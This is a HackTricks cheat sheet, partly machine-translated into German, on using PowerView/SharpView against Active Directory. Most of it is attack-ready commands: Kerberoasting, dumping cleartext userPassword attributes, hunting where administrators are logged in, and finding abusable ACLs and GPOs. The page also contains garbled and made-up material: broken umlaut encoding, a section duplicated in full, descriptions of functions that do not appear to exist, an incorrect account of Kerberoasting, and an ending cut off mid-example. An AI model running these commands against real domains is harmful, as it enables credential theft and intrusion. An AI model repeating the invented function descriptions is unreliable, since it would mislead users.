# PowerView/SharpView

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

Die aktuellste Version von PowerView befindet sich immer im dev-Zweig von PowerSploit: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) ist ein .NET-Port von [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Schnelle Enumeration
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Dom√§neninformationen

#### Get-Domain

```
Get-Domain
```

Diese Funktion gibt Informationen √ºber die aktuelle Dom√§ne zur√ºck, einschlie√ülich des Dom√§nennamens, des Forest-Namens, des Dom√§nencontrollers und der Dom√§nenfunktionsebene.

#### Get-DomainController

```
Get-DomainController
```

Diese Funktion gibt eine Liste der Dom√§nencontroller in der aktuellen Dom√§ne zur√ºck, einschlie√ülich des Dom√§nennamens, des Hostnamens, der IP-Adresse und des Betriebssystems.

#### Get-DomainPolicy

```
Get-DomainPolicy
```

Diese Funktion gibt Informationen zu den Gruppenrichtlinienobjekten (Group Policy Objects, GPOs) in der aktuellen Dom√§ne zur√ºck, einschlie√ülich des Namens, des verkn√ºpften Pfads und der Einstellungen.

#### Get-DomainTrust

```
Get-DomainTrust
```

Diese Funktion gibt Informationen √ºber die Vertrauensstellungen der aktuellen Dom√§ne zur√ºck, einschlie√ülich des vertrauenden und des vertrauten Dom√§nennamens.

#### Get-DomainUser

```
Get-DomainUser
```

Diese Funktion gibt eine Liste der Benutzer in der aktuellen Dom√§ne zur√ºck, einschlie√ülich des Benutzernamens, des vollst√§ndigen Namens, der SID und der Gruppenmitgliedschaften.

#### Get-DomainGroup

```
Get-DomainGroup
```

Diese Funktion gibt eine Liste der Gruppen in der aktuellen Dom√§ne zur√ºck, einschlie√ülich des Gruppennamens, der SID und der Mitglieder.

#### Get-DomainComputer

```
Get-DomainComputer
```

Diese Funktion gibt eine Liste der Computer in der aktuellen Dom√§ne zur√ºck, einschlie√ülich des Computernamens, der SID und der Betriebssysteminformationen.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### Benutzer, Gruppen, Computer & OUs

PowerView bietet verschiedene Funktionen, um Informationen √ºber Benutzer, Gruppen, Computer und Organizational Units (OUs) in einer Windows-Dom√§ne zu sammeln.

#### Benutzer

Um Informationen √ºber Benutzer zu erhalten, k√∂nnen Sie den Befehl `Get-NetUser` verwenden. Dieser Befehl gibt eine Liste aller Benutzer in der Dom√§ne zur√ºck, einschlie√ülich ihres Benutzernamens, ihrer SID, ihres Passwortalters und anderer relevanter Informationen.

#### Gruppen

Mit dem Befehl `Get-NetGroup` k√∂nnen Sie Informationen √ºber Gruppen in der Dom√§ne abrufen. Dieser Befehl gibt eine Liste aller Gruppen zur√ºck, einschlie√ülich ihres Namens, ihrer SID und anderer relevanter Informationen.

#### Computer

Um Informationen √ºber Computer in der Dom√§ne zu erhalten, verwenden Sie den Befehl `Get-NetComputer`. Dieser Befehl gibt eine Liste aller Computer zur√ºck, einschlie√ülich ihres Namens, ihrer SID, ihrer Betriebssystemversion und anderer relevanter Informationen.

#### Organizational Units (OUs)

Mit dem Befehl `Get-NetOU` k√∂nnen Sie Informationen √ºber die Organizational Units (OUs) in der Dom√§ne abrufen. Dieser Befehl gibt eine Liste aller OUs zur√ºck, einschlie√ülich ihres Namens, ihrer SID und anderer relevanter Informationen.

Diese Funktionen erm√∂glichen es Ihnen, schnell und einfach Informationen √ºber Benutzer, Gruppen, Computer und OUs in einer Windows-Dom√§ne zu sammeln, was bei Penetrationstests und anderen Sicherheitsanalysen n√ºtzlich sein kann.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Anmeldung und Sitzungen

PowerView provides several commands to interact with logon and session information on a Windows system. These commands can be useful for gathering information about user logon sessions and active sessions on a target machine.

#### Get-NetLoggedon

The `Get-NetLoggedon` command retrieves information about currently logged on users on a target system. It provides details such as the user's name, domain, logon ID, and logon time.

#### Get-NetSession

The `Get-NetSession` command retrieves information about active sessions on a target system. It includes details such as the session ID, user name, computer name, and session start time.

#### Get-NetSessionComputer

The `Get-NetSessionComputer` command retrieves information about the computers involved in active sessions on a target system. It provides details such as the computer name, session ID, and user name.

#### Get-NetSessionUser

The `Get-NetSessionUser` command retrieves information about the users involved in active sessions on a target system. It includes details such as the user name, session ID, and computer name.

#### Get-NetSessionGroup

The `Get-NetSessionGroup` command retrieves information about the session groups on a target system. It provides details such as the group name, session ID, and user name.

#### Get-NetSessionGroupMember

The `Get-NetSessionGroupMember` command retrieves information about the members of a session group on a target system. It includes details such as the group name, session ID, and user name.

These commands can be used to gain insights into the logon and session activity on a Windows system, which can be valuable for various purposes, including auditing, troubleshooting, and security assessments.
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Gruppenrichtlinienobjekt - GPOs

Wenn ein Angreifer **hohe Berechtigungen √ºber ein GPO** hat, k√∂nnte er in der Lage sein, diese zu missbrauchen, um **Berechtigungen f√ºr einen Benutzer hinzuzuf√ºgen**, einen **lokalen Administratorbenutzer** zu einem Host hinzuzuf√ºgen oder eine **geplante Aufgabe** (sofortige Ausf√ºhrung) zu erstellen, um eine Aktion durchzuf√ºhren.\
F√ºr [**weitere Informationen dazu und wie man es missbrauchen kann, folgen Sie diesem Link**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
Lernen Sie, wie Sie **Berechtigungen √ºber GPOs und ACLs ausnutzen** k√∂nnen:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Gemeinsam genutzte Dateien und Ordner

PowerView bietet verschiedene Funktionen, um Informationen √ºber gemeinsam genutzte Dateien und Ordner in einem Windows-Netzwerk zu sammeln. Diese Informationen k√∂nnen f√ºr Pentester n√ºtzlich sein, um potenzielle Schwachstellen oder Angriffsvektoren zu identifizieren.

#### Get-NetShare

Die `Get-NetShare`-Funktion erm√∂glicht es, eine Liste der freigegebenen Ressourcen auf einem Remote-Computer abzurufen. Dies umfasst sowohl freigegebene Ordner als auch Drucker. Die Funktion gibt Informationen wie den Namen der Freigabe, den Pfad, die Zugriffsrechte und den Typ der Freigabe zur√ºck.

Beispiel:

```powershell
Get-NetShare
```

#### Get-NetFileServer

Die `Get-NetFileServer`-Funktion erm√∂glicht es, eine Liste der Dateiserver in einem Windows-Netzwerk abzurufen. Diese Funktion gibt Informationen wie den Namen des Servers, die IP-Adresse, das Betriebssystem und die Dom√§ne zur√ºck.

Beispiel:

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

Die `Get-NetFileShare`-Funktion erm√∂glicht es, eine Liste der freigegebenen Ordner auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Namen der Freigabe, den Pfad, die Zugriffsrechte und den Typ der Freigabe zur√ºck.

Beispiel:

```powershell
Get-NetFileShare
```

#### Get-NetSession

Die `Get-NetSession`-Funktion erm√∂glicht es, eine Liste der aktiven Sitzungen auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, die Sitzungsdauer und den Status der Sitzung zur√ºck.

Beispiel:

```powershell
Get-NetSession
```

#### Get-NetLoggedon

Die `Get-NetLoggedon`-Funktion erm√∂glicht es, eine Liste der aktuell angemeldeten Benutzer auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, die Sitzungsdauer und den Status der Sitzung zur√ºck.

Beispiel:

```powershell
Get-NetLoggedon
```

#### Get-NetFile

Die `Get-NetFile`-Funktion erm√∂glicht es, eine Liste der ge√∂ffneten Dateien auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, den Dateinamen und den Zugriffsmodus zur√ºck.

Beispiel:

```powershell
Get-NetFile
```

#### Get-NetFileAccess

Die `Get-NetFileAccess`-Funktion erm√∂glicht es, eine Liste der Benutzer mit Zugriff auf eine bestimmte Datei auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer und den Zugriffsmodus zur√ºck.

Beispiel:

```powershell
Get-NetFileAccess -Path "\\fileserver\share\file.txt"
```

#### Get-NetFilePermission

Die `Get-NetFilePermission`-Funktion erm√∂glicht es, die Berechtigungen f√ºr eine bestimmte Datei auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer und die Berechtigungen zur√ºck.

Beispiel:

```powershell
Get-NetFilePermission -Path "\\fileserver\share\file.txt"
```

#### Get-NetFileServer

Die `Get-NetFileServer`-Funktion erm√∂glicht es, eine Liste der Dateiserver in einem Windows-Netzwerk abzurufen. Diese Funktion gibt Informationen wie den Namen des Servers, die IP-Adresse, das Betriebssystem und die Dom√§ne zur√ºck.

Beispiel:

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

Die `Get-NetFileShare`-Funktion erm√∂glicht es, eine Liste der freigegebenen Ordner auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Namen der Freigabe, den Pfad, die Zugriffsrechte und den Typ der Freigabe zur√ºck.

Beispiel:

```powershell
Get-NetFileShare
```

#### Get-NetSession

Die `Get-NetSession`-Funktion erm√∂glicht es, eine Liste der aktiven Sitzungen auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, die Sitzungsdauer und den Status der Sitzung zur√ºck.

Beispiel:

```powershell
Get-NetSession
```

#### Get-NetLoggedon

Die `Get-NetLoggedon`-Funktion erm√∂glicht es, eine Liste der aktuell angemeldeten Benutzer auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, die Sitzungsdauer und den Status der Sitzung zur√ºck.

Beispiel:

```powershell
Get-NetLoggedon
```

#### Get-NetFile

Die `Get-NetFile`-Funktion erm√∂glicht es, eine Liste der ge√∂ffneten Dateien auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer, den Dateinamen und den Zugriffsmodus zur√ºck.

Beispiel:

```powershell
Get-NetFile
```

#### Get-NetFileAccess

Die `Get-NetFileAccess`-Funktion erm√∂glicht es, eine Liste der Benutzer mit Zugriff auf eine bestimmte Datei auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer und den Zugriffsmodus zur√ºck.

Beispiel:

```powershell
Get-NetFileAccess -Path "\\fileserver\share\file.txt"
```

#### Get-NetFilePermission

Die `Get-NetFilePermission`-Funktion erm√∂glicht es, die Berechtigungen f√ºr eine bestimmte Datei auf einem Remote-Computer abzurufen. Diese Funktion gibt Informationen wie den Benutzernamen, den Computer und die Berechtigungen zur√ºck.

Beispiel:

```powershell
Get-NetFilePermission -Path "\\fileserver\share\file.txt"
```
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Dom√§nenvertrauen

Domain Trust (Dom√§nenvertrauen) ist ein Konzept in Windows-Netzwerken, das es erm√∂glicht, Ressourcen und Authentifizierungsinformationen zwischen verschiedenen Dom√§nen auszutauschen. Durch das Einrichten von Dom√§nenvertrauen k√∂nnen Benutzer in einer Dom√§ne auf Ressourcen in einer anderen Dom√§ne zugreifen, ohne sich erneut authentifizieren zu m√ºssen.

Es gibt verschiedene Arten von Dom√§nenvertrauen, darunter:

- Einwegvertrauen: Hierbei vertraut eine Dom√§ne einer anderen Dom√§ne, aber die umgekehrte Richtung gilt nicht.
- Zweiwegvertrauen: Hierbei vertrauen sich zwei Dom√§nen gegenseitig.

Dom√§nenvertrauen kann sowohl zwischen Dom√§nen innerhalb derselben Gesamtstruktur (Gesamtstrukturvertrauen) als auch zwischen Dom√§nen in unterschiedlichen Gesamtstrukturen (Externe Vertrauensstellung) eingerichtet werden.

Das Verst√§ndnis von Dom√§nenvertrauen ist f√ºr Pentester von Bedeutung, da es m√∂glicherweise Auswirkungen auf die Durchf√ºhrung von Angriffen und das Ausnutzen von Schwachstellen in einem Netzwerk hat.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### Leicht zug√§ngliche Ziele

Die Bezeichnung "Low-hanging fruit" bezieht sich auf leicht zug√§ngliche Ziele, die f√ºr Angreifer attraktiv sind, da sie wenig Aufwand erfordern, um erfolgreich angegriffen zu werden. Diese Ziele sind oft schlecht gesichert oder weisen bekannte Schwachstellen auf.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### Gel√∂schte Objekte

PowerView provides several functions to enumerate and manipulate deleted objects in Active Directory. These functions can be useful for pentesters to gain insights into the AD environment and potentially identify security vulnerabilities.

#### Get-DomainDeletedObject

The `Get-DomainDeletedObject` function allows you to retrieve information about deleted objects in Active Directory. It queries the `tombstone` attribute of objects to identify those that have been deleted.

```powershell
Get-DomainDeletedObject
```

#### Restore-DomainDeletedObject

The `Restore-DomainDeletedObject` function enables you to restore deleted objects in Active Directory. This can be useful if you accidentally delete an object or need to recover a deleted object for further analysis.

```powershell
Restore-DomainDeletedObject -SamAccountName <deleted_object_samaccountname>
```

#### Remove-DomainDeletedObject

The `Remove-DomainDeletedObject` function allows you to permanently remove deleted objects from Active Directory. This can be useful to clean up the AD environment and remove any traces of deleted objects.

```powershell
Remove-DomainDeletedObject -SamAccountName <deleted_object_samaccountname>
```

#### Get-DomainObjectAcl

The `Get-DomainObjectAcl` function retrieves the access control list (ACL) for a specified object in Active Directory. This can be useful to understand the permissions and security settings associated with an object.

```powershell
Get-DomainObjectAcl -Identity <object_identity>
```

#### Get-DomainObjectOwner

The `Get-DomainObjectOwner` function allows you to retrieve the owner of a specified object in Active Directory. This can be useful to identify who has control over an object and potentially exploit misconfigured permissions.

```powershell
Get-DomainObjectOwner -Identity <object_identity>
```

By leveraging these PowerView functions, pentesters can effectively enumerate and manipulate deleted objects in Active Directory, gaining valuable insights into the AD environment and potentially identifying security weaknesses.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### MISC

#### SID zu Namen

```powershell
ConvertFrom-SID -SID <SID>
```

Diese Funktion konvertiert eine Sicherheitskennung (SID) in den entsprechenden Namen. Geben Sie die SID als Argument f√ºr den Parameter `-SID` an.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
Kerberoast ist eine Technik, bei der ein Angreifer die Schwachstellen in der Kerberos-Authentifizierung ausnutzt, um Kennw√∂rter von Dienstkonten zu stehlen. Diese Konten werden normalerweise von Diensten verwendet, um sich bei anderen Systemen oder Diensten anzumelden. Der Angreifer kann den Kerberos-Ticket-Granting-Ticket (TGT) anfordern und dann den Angriff durchf√ºhren, um den geheimen Schl√ºssel des Dienstkontos zu extrahieren. Sobald der geheime Schl√ºssel extrahiert wurde, kann der Angreifer das Kennwort offline knacken und Zugriff auf das Konto erhalten. Dieser Angriff ist besonders effektiv, da die meisten Dienstkonten schwache Kennw√∂rter haben und selten ge√§ndert werden.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### Verwenden Sie verschiedene Anmeldeinformationen (Argument)

Sie k√∂nnen PowerShell verwenden, um sich mit verschiedenen Anmeldeinformationen bei einem Remote-Computer anzumelden. Dies kann n√ºtzlich sein, um Berechtigungen zu √ºberpr√ºfen oder auf Ressourcen zuzugreifen, f√ºr die Sie normalerweise keine Zugriffsrechte haben.

Die Syntax f√ºr das Angeben von Anmeldeinformationen lautet:

```powershell
Get-NetUser -Credential <Anmeldeinformationen>
```

Ersetzen Sie `<Anmeldeinformationen>` durch die gew√ºnschten Anmeldeinformationen. Sie k√∂nnen entweder einen Benutzernamen und ein Kennwort oder ein PSCredential-Objekt angeben.

Beispiel:

```powershell
$cred = Get-Credential
Get-NetUser -Credential $cred
```

Dieses Beispiel fordert den Benutzer zur Eingabe von Anmeldeinformationen auf und verwendet diese, um sich bei einem Remote-Computer anzumelden und Informationen √ºber die Benutzer auf diesem Computer abzurufen.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### Benutzer imitieren

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to execute commands as if you were the specified user.

```powershell
Invoke-UserImpersonation -Username <Username> -Command <Command>
```

Replace `<Username>` with the username of the user you want to impersonate, and `<Command>` with the command you want to execute as that user.

For example, to impersonate the user "JohnDoe" and execute the command "whoami", you would use the following command:

```powershell
